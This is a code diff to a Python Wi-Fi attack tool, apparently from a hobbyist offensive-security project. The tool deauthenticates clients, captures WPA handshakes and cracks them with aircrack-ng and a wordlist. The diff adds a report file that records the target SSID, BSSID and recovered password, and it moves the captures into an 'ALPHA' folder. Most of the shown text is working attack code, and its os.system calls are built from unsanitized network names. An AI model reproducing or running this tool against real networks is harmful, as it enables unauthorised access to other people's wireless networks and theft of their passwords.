@@ -3,14 +3,71 @@ from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Elt
 from scapy.layers.eap import EAPOL
 import threading,random,time,os,subprocess,sys,re,shutil
 
-target_ap=None
-target_ssid=None
+target_ap=None 
+target_ssid=None 
 data_networks={}
 data_ch={}
 data_bssid={}
 networks={}
+psk=None
 n=0
 stop_hopper = threading.Event()
+
+
+def save_information():
+     global psk , target_ssid , target_ap
+     
+     if psk == None:
+        psk = "PASSWORD NOT FOUND"
+     with open(f"{target_ssid}.txt",'w') as f:
+        f.write(f""" \n
+      ================================================================
+                               CRACK REPORT
+      ================================================================
+
+               [+] Capture File : capture.cap
+               [+] Status       : HANDSHAKE FOUND
+
+               [+] SSID         : {target_ssid}
+               [+] BSSID        : {target_ap}
+               [+] PSK          : {psk}
+
+                   ⠀                                                               ⠀⠀⣀⡠⢤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡴⠟⠃⠀⠀⠙⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
+⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
+⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
+⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
+⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
+⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
+⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
+⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
+                   
+        "ALPHA said, if you know yourself, you can know the world"
+                   
+      ================================================================
+                             END OF REPORT
+      ================================================================            
+⠀         
+        
+        
+        """) 
+     os.system(f"mv {target_ssid}.txt   ALPHA/{target_ssid}/")
+     print("\n[+] Information about the handshake cracking has been saved in ALPHA.")
+        
 
 def deauth_attack():
       global target_ap
@@ -57,18 +114,31 @@ def check_tools():
       os.system("clear")
 
 def crack_handshake():
-        global target_ssid
+        global target_ssid,psk
         print("[+] start cracking please wait ......")
         c=subprocess.Popen(['aircrack-ng','-w','passwordlist.txt',f'{target_ssid}-01.cap'],stdout=subprocess.PIPE,stderr=subprocess.DEVNULL, text=True)
         stdout,_=c.communicate()
         match=re.search(r'KEY FOUND!\s*\[\s*([^\s\]]+)',stdout)
         if match:
              password=match.group(1).strip()
-             print(f'[+] PASSWORD FOUND: {password}')
-             os.system(f"rm -rf {target_ssid}-01.cap & rm -rf {target_ssid}-01.csv & rm -rf {target_ssid}-01.kismet.csv & rm -rf {target_ssid}-01.kismet.netxml & rm -rf {target_ssid}-01.kismet.netxml & rm -rf                  c    {target_ssid}-01.log.csv")   
+             psk=password
+             print(f'[*] PASSWORD FOUND: {password}')
+             os.system(f" rm -rf {target_ssid}-01.csv & rm -rf {target_ssid}-01.kismet.csv & rm -rf {target_ssid}-01.kismet.netxml & rm -rf {target_ssid}-01.kismet.netxml & rm -rf                  c    {target_ssid}-01.log.csv")   
         else:
              print("[-] PASSWORD NOT FOUND ") 
-             os.system(f"rm -rf {target_ssid}-01.cap & rm -rf {target_ssid}-01.csv & rm -rf {target_ssid}-01.kismet.csv & rm -rf {target_ssid}-01.kismet.netxml & rm -rf {target_ssid}-01.kismet.netxml & rm -rf                  c    {target_ssid}-01.log.csv")      
+             os.system(f"rm -rf {target_ssid}-01.csv & rm -rf {target_ssid}-01.kismet.csv & rm -rf {target_ssid}-01.kismet.netxml & rm -rf {target_ssid}-01.kismet.netxml & rm -rf                  c    {target_ssid}-01.log.csv") 
+             
+        time.sleep(2)     
+             
+        if os.path.isdir("ALPHA"):
+             if os.path.isdir(f"ALPHA/{target_ssid}"):
+                 os.system(f"rm -rf ALPHA/{target_ssid}/")
+                 os.system(f"mkdir -p ALPHA/{target_ssid} & mv {target_ssid}-01.cap ALPHA/{target_ssid}/") 
+             else:    
+                 os.system(f"mkdir -p ALPHA/{target_ssid} & mv {target_ssid}-01.cap ALPHA/{target_ssid}/")  
+        else:  
+             os.system(f"mkdir -p ALPHA & mkdir -p ALPHA/{target_ssid} & mv {target_ssid}-01.cap ALPHA/{target_ssid}/")       
+        save_information()   
 
 def handshake_check():
         global target_ssid ,target_ap
@@ -99,7 +169,7 @@ def handshake_check():
                       if target_ap in [addr1.lower(), addr2.lower()]:
                             count += 1
         if count >= 2:
-            print("[+] Handshake FOUND ")
+            print("[+] Handshake FOUND ") 
             crack_handshake()
         else:
             print("[-] Handshake NOT found ")   
@@ -189,7 +259,13 @@ print("""
 ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠛⠻⠿⣿⣿⣿⡿⠿⠿⠿⠿⠿⢿⣿⣿⠏⠀⠀⠀⠀⠀⠀
 
-              GHOST X
++------------+--------------------------------------+
+| Platform   | Link                                 |
++------------+--------------------------------------+
+| YouTube    | @Mo3adSec                            |
+| GitHub     | https://github.com/Mo3adSec/         |
++------------+--------------------------------------+
+
 
 """)
 print("[+]  starting scan ............")
